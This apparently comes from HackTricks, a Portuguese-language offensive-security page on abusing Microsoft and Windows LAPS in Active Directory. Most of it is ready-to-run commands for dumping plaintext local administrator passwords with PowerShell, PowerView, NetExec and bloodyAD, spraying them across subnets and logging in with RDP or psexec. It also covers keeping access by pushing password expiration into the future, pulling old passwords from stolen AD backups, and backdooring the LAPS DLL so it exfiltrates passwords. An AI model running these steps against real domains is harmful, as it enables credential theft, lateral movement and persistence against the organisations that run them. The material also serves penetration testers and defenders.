# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informações Básicas

Atualmente, existem **2 variantes de LAPS** que você pode encontrar durante uma avaliação:

- **Legacy Microsoft LAPS**: armazena a senha do administrador local em **`ms-Mcs-AdmPwd`** e o tempo de expiração em **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado ao Windows desde as atualizações de abril de 2023): ainda pode emular o modo legado, mas no modo nativo usa atributos **`msLAPS-*`**, suporta **password encryption**, **password history** e **DSRM password backup** para domain controllers.

LAPS foi projetado para gerenciar **senhas de administrador local**, tornando-as **únicas, aleatórias e alteradas frequentemente** em computadores ingressados no domain. Se você conseguir ler esses atributos, normalmente pode **pivot as the local admin** para o host afetado. Em muitos ambientes, a parte interessante não é apenas ler a senha em si, mas também descobrir **quem recebeu acesso delegado** aos atributos da senha.

### Legacy Microsoft LAPS attributes

Nos objetos de computador do domain, a implementação do Legacy Microsoft LAPS resulta na adição de dois atributos:

- **`ms-Mcs-AdmPwd`**: **senha do administrador em texto simples**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tempo de expiração da senha**

### Windows LAPS attributes

O Windows LAPS nativo adiciona vários novos atributos aos objetos de computador:

- **`msLAPS-Password`**: blob de senha em texto claro armazenado como JSON quando a encryption não está habilitada
- **`msLAPS-PasswordExpirationTime`**: tempo de expiração agendado
- **`msLAPS-EncryptedPassword`**: senha atual criptografada
- **`msLAPS-EncryptedPasswordHistory`**: histórico de senhas criptografadas
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dados de senha DSRM criptografados para domain controllers
- **`msLAPS-CurrentPasswordVersion`**: rastreamento de versão baseado em GUID usado por uma lógica mais nova de detecção de rollback (schema do forest do Windows Server 2025)

Quando **`msLAPS-Password`** é legível, o valor é um objeto JSON contendo o nome da conta, o horário de atualização e a senha em texto claro, por exemplo:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifique se está ativado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Acesso à senha do LAPS

Você poderia **baixar a política bruta do LAPS** de `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e então usar **`Parse-PolFile`** do pacote [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para converter esse arquivo para um formato legível por humanos.

### Cmdlets PowerShell legados do Microsoft LAPS

Se o módulo legado do LAPS estiver instalado, os seguintes cmdlets normalmente estão disponíveis:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets do Windows LAPS no PowerShell

O Windows LAPS nativo vem com um novo módulo do PowerShell e novos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Alguns detalhes operacionais importam aqui:

- **`Get-LapsADPassword`** lida automaticamente com **legacy LAPS**, **clear-text Windows LAPS** e **encrypted Windows LAPS**.
- Se a password estiver encrypted e você puder **ler** mas não **decrypt**-la, o cmdlet retorna metadata como **`Source`**, **`DecryptionStatus`** e **`AuthorizedDecryptor`** mesmo quando não consegue retornar a clear-text password.
- Em **encrypted Windows LAPS**, **read permission** e **decrypt permission** são **controles diferentes**. Ter acesso de leitura ao OU / object não significa automaticamente que você pode decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** só está disponível quando a **Windows LAPS encryption** está habilitada.
- Em domain controllers, a source retornada pode ser **`EncryptedDSRMPassword`**.

Isso é útil durante uma assessment porque o campo **`AuthorizedDecryptor`** informa **para qual user ou group o blob foi encrypted**, muitas vezes transformando uma leitura de password com falha em um novo alvo de privilege-escalation.

### PowerView / LDAP

**PowerView** também pode ser usado para descobrir **quem pode read the password e read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** for legível, analise o JSON retornado e extraia **`p`** para a senha e **`n`** para o nome da conta de admin local gerenciada.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Esse campo **`n`** importa em implantações mais novas porque o **Windows LAPS automatic account management** pode visar uma **conta customizada** em vez da conta **`Administrator`** встроída, e sistemas mais novos **Windows 11 24H2 / Windows Server 2025** podem até **randomizar** esse nome de conta.

### Linux / remote tooling

Ferramentas modernas suportam tanto o Microsoft LAPS legado quanto o Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Builds recentes do **NetExec** suportam **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ainda é útil para o **legacy Microsoft LAPS** a partir do Linux, mas ele só mira **`ms-Mcs-AdmPwd`**.
- Ferramentas cross-platform mais novas, como **`LAPS4LINUX`**, ferramentas baseadas em **`dpapi-ng`** e workflows recentes do **NetExec** também podem lidar com **native Windows LAPS** a partir de hosts não Windows.
- Se o ambiente usa **encrypted Windows LAPS**, uma simples leitura LDAP não é suficiente; você também precisa ser um **authorized decryptor** (ou material de decriptação equivalente, como material offline de chave raiz DPAPI-NG do domain).
- No **Windows 11 24H2 / Windows Server 2025**, não assuma que o admin local gerenciado é sempre **`Administrator`**. O gerenciamento automático de conta pode criar uma conta customizada e, opcionalmente, randomizar seu nome, então descubra primeiro o nome da conta via **`n`** / **`Account`** antes de usar **`--laps`** em escala.

### Directory synchronization abuse

Se você tiver permissões de **directory synchronization** em nível de domain, em vez de acesso direto de leitura em cada objeto de computador, o LAPS ainda pode ser interessante.

A combinação de **`DS-Replication-Get-Changes`** com **`DS-Replication-Get-Changes-In-Filtered-Set`** ou **`DS-Replication-Get-Changes-All`** pode ser usada para sincronizar atributos **confidential / RODC-filtered** como o legacy **`ms-Mcs-AdmPwd`**. O BloodHound modela isso como **`SyncLAPSPassword`**. Consulte [DCSync](dcsync.md) para o contexto das permissões de replicação.

## LAPSToolkit

O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração de LAPS com várias funções.\
Uma delas é fazer o parsing de **`ExtendedRights`** para **todos os computers com LAPS habilitado.** Isso mostra **grupos** especificamente **delegados para ler senhas de LAPS**, que muitas vezes são users em grupos protegidos.\
Uma **account** que tenha **joined a computer** a um domain recebe `All Extended Rights` sobre esse host, e esse direito dá à **account** a capacidade de **ler senhas**. A enumeração pode mostrar uma user account que consegue ler a senha de LAPS em um host. Isso pode nos ajudar a **mirar users específicos do AD** que conseguem ler senhas de LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Se você não tiver um PowerShell interativo, pode abusar desse privilégio remotamente via LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Isso despeja todos os secrets do LAPS que o usuário consegue ler, permitindo que você se mova lateralmente com uma senha de administrador local diferente.

## Usando senha do LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistência do LAPS

### Data de Expiração

Uma vez com privilégios de admin, é possível **obter as passwords** e **impedir** que uma máquina **atualize** a sua **password** **definindo a data de expiração para o futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
O Native Windows LAPS usa **`msLAPS-PasswordExpirationTime`** em vez disso:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> A senha ainda será rotacionada se um **admin** usar **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ou se **Do not allow password expiration time longer than required by policy** estiver habilitado.

### Limitação de rollback de snapshot em Windows LAPS mais recente

Truques antigos de rollback de snapshot / imagem são **menos confiáveis** contra implantações recentes do **Windows LAPS**. No **Windows 11 24H2 / Windows Server 2025**, se o schema da forest incluir **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), o client compara um GUID armazenado em cache local com o valor salvo no AD e **rotaciona imediatamente a senha** quando um rollback cria um **torn state**.

Na prática, isso significa que persistência baseada em snapshot ou tentativas de ressuscitar uma senha local antiga conhecida podem falhar rapidamente em vez de sobreviver até a próxima expiração normal.

Essa proteção se aplica apenas ao **AD-backed Windows LAPS** e ainda depende de a máquina revertida conseguir **autenticar de volta no AD**. Se a máquina não conseguir mais falar com o AD, **password history** ou **AD backup access** ainda podem salvar o dia.

### Limitação de adulteração do gerenciamento automático de contas

Quando o **automatic account management** está habilitado, o Windows LAPS controla o ciclo de vida da conta local admin gerenciada. Tentativas inesperadas de renomear, reconfigurar ou adulterar essa conta podem ser rejeitadas com **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, então a persistência que depende de modificar silenciosamente a conta LAPS gerenciada é menos confiável em endpoints mais novos.

### Recuperando senhas históricas de backups do AD

Quando **Windows LAPS encryption + password history** está habilitado, backups do AD montados podem se tornar uma fonte adicional de secrets. Se você conseguir acessar um snapshot do AD montado e usar o **recovery mode**, você pode consultar senhas antigas armazenadas sem falar com um DC ativo.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Isto é principalmente relevante durante **AD backup theft**, **offline forensics abuse** ou **disaster-recovery media access**.

### Backdoor

O código-fonte original para o legado Microsoft LAPS pode ser encontrado [aqui](https://github.com/GreyCorbel/admpwd), portanto é possível colocar um backdoor no código (dentro do método `Get-AdmPwdPassword` em `Main/AdmPwd.PS/Main.cs`, por exemplo) que de alguma forma **exfiltre novas passwords ou as armazene em algum lugar**.

Depois, compile a nova `AdmPwd.PS.dll` e faça upload dela para a máquina em `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e altere o modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
